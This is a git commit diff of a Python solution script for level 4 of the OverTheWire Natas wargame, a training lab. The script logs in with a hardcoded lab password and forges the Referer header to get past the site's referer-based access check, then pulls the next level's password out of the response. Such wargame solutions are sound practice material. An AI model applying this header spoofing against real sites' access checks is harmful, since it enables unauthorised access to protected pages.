e51528927a335364049f95f902b0ffadb44ee1fc
Joakim Bajoul Kakaei <joabaj88@gmail.com>
2017-06-13 16:42:07 +0100

    Initial commit

--- natas/natas4.py
+++ natas/natas4.py
@@ -1,26 +1,29 @@
 import requests
 from requests.auth import HTTPBasicAuth
 
+
+REFERER = 'http://natas5.natas.labs.overthewire.org/'
+KEYWORD = 'natas5'
+
+
 def exploit(host, credentials):
-    print(host)
+    """TODO: docstring here"""
     try:
+        response = requests.get(host,
+                                auth=HTTPBasicAuth(*credentials),
+                                headers={'referer': REFERER})
 
-        r = requests.get(host,
-                         auth=HTTPBasicAuth(credentials[0],
-                                            credentials[1]),
-                         headers={'referer': 'http://natas5.natas.labs.overthewire.org/'}
-                         )
-
-        print([line for line in r.content.decode('ascii').split('\n') \
-               if 'natas5' in line][0])
-
-    except Exception as e:
+        response_lines = response.content.decode('ascii').split('\n')
+        return next((line for line in response_lines if KEYWORD in line), 'Keyword not found')
+    except requests.RequestException as e:
         print(e)
+
 
 def main():
     host = 'http://natas4.natas.labs.overthewire.org'
     credentials = ('natas4', 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ')
-    exploit(host, credentials)
+    print(exploit(host, credentials))
+
 
 if __name__ == '__main__':
     main()
